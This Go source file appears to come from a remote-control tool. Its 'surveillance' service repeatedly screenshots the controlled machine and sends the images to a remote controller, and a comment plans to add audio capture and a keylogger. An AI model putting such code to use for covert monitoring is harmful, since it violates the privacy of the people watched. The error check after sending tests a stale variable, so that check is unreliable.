package surveillance

import (
	"time"

	"github.com/gardc/remotectl/comms"
	"github.com/gardc/remotectl/comms/wsslave"
)

type SurveillanceStateManagerService struct {
	conn *wsslave.SlaveConn

	CaptureScreen     bool
	CaptureScreenRate int // seconds
	// Add more here in the future. Audio? Keylogger?
}

func (s *SurveillanceStateManagerService) Start() {
	// screen loop, sleep CaptureScreenRate
	go s.screenshotLoop()
}

func (s *SurveillanceStateManagerService) screenshotLoop() {
	for {
		select {
		case <-s.conn.Disconnected:
			return
		default:
			if s.CaptureScreen {
				// capture screens
				screens, err := Screenshot()
				if err != nil {
					panic(err)
				}
				msgData, err := comms.CreateMessage(comms.ScreenCaptureType, screens)
				if err != nil {
					panic(err)
				}
				s.conn.SendMessage(msgData)
				if err != nil {
					panic(err)
				}
			}
			time.Sleep(time.Duration(s.CaptureScreenRate) * time.Second)
		}
	}
}
